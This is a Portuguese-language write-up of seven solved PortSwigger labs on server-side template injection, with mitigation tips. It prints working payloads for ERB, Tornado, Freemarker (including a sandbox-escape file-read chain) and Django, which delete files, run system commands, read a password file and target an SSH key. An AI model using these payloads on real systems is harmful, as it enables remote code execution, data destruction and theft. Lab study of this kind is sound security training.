📝 Server-Side Template Injection (SSTI)
PortSwigger Web Security Academy — Practitioner & Expert Labs

🎯 O que é essa vulnerabilidade?
A Injeção de Modelo Lado Servidor ocorre quando a aplicação insere dados enviados pelo usuário diretamente no código do motor de renderização, sem nenhuma validação ou proteção. Isso permite que o invasor identifique qual motor está sendo usado, execute comandos arbitrários, acesse dados sensíveis e até contorne restrições de segurança como ambientes isolados ("sandbox").

🧪 Laboratórios Resolvidos

🟢 Nível: Practitioner

1. Basic server-side template injection — ✅ Resolvido
Motor: ERB (Embedded Ruby)
Cenário: O parâmetro message da URL é renderizado diretamente pelo template.
Confirmação: <%= 7*7 %> retorna 49 na página.
Exploração: <%= system("rm /home/carlos/morale.txt") %>
Lição: Sintaxe básica do motor já permite execução total de comandos.

2. Basic server-side template injection (code context) — ✅ Resolvido
Motor: Tornado (Python)
Cenário: O valor escolhido para exibição do nome do autor fica dentro de uma expressão já existente.
Confirmação: user.name}}{{7*7}} retorna o resultado do cálculo ao lado do nome.
Exploração: user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}
Lição: É preciso "quebrar" o contexto original antes de injetar o código.

3. Server-side template injection using documentation — ✅ Resolvido
Motor: Freemarker (Java)
Cenário: Edição de descrições de produtos permite inserir sintaxe do template.
Confirmação: ${foobar} revela o motor na mensagem de erro.
Exploração: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
Lição: A documentação oficial mostra recursos perigosos que não foram bloqueados.

4. Server-side template injection in an unknown language with a documented exploit — ✅ Resolvido
Motor: Handlebars (Node.js)
Cenário: Motor não identificado de início; só mensagens de erro ajudam a descobrir.
Confirmação: Sintaxe inválida revela o Handlebars nos logs.
Exploração: Uso de exploit público adaptado para o alvo na URL.
Lição: Quando o motor é desconhecido, exploits já conhecidos pela comunidade resolvem o problema.

5. Server-side template injection with information disclosure via user-supplied objects — ✅ Resolvido
Motor: Django Template Language
Cenário: Objetos internos do framework ficam acessíveis no template.
Confirmação: {% debug %} lista todos os objetos disponíveis.
Exploração: {{settings.SECRET_KEY}} revela a chave secreta do sistema.
Lição: Acesso não filtrado a objetos expõe dados críticos da aplicação.

🔴 Nível: Expert
6. Server-side template injection in a sandboxed environment — ✅ Resolvido
Motor: Freemarker
Cenário: Há uma tentativa de bloquear acesso a recursos perigosos, mas mal feita.
Confirmação: ${product.getClass()} prova que métodos nativos ainda estão liberados.
Exploração: Cadeia de métodos nativos do Java para contornar a proteção e ler arquivos:
plaintext

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}

Lição: Sandboxes mal implementadas podem ser quebradas usando apenas métodos nativos de objetos.

7. Server-side template injection with a custom exploit — ✅ Resolvido
Motor: Twig / Tornado
Cenário: Não há função pronta para executar comandos — é preciso usar métodos já existentes na aplicação.
Confirmação: Erros revelam os métodos setAvatar() e gdprDelete() do objeto user.
Exploração:

    Definir o arquivo alvo como avatar: user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
    Chamar o método nativo de exclusão: user.gdprDelete()
    Lição: Muitas vezes a exploração não precisa de código novo — basta usar o que a própria aplicação já oferece de forma insegura.

🛡️ Lições aprendidas e mitigação

    Sempre valide e escape qualquer dado enviado pelo usuário antes de inserir em templates.
    Restrinja o que os templates podem acessar: bloqueie métodos nativos, objetos internos e funções de sistema.
    Implemente sandboxes bem testadas e atualizadas, evitando deixar métodos fundamentais como getClass() acessíveis.
    Nunca confie apenas em listas de permissão superficiais — atacantes podem encontrar caminhos alternativos.

Autor: [Aislan]
Plataforma: PortSwigger Web Security Academy
Seção concluída: Server-Side Template Injection — Practitioner + Expert
Progresso: 7/7 laboratórios resolvidos ✅
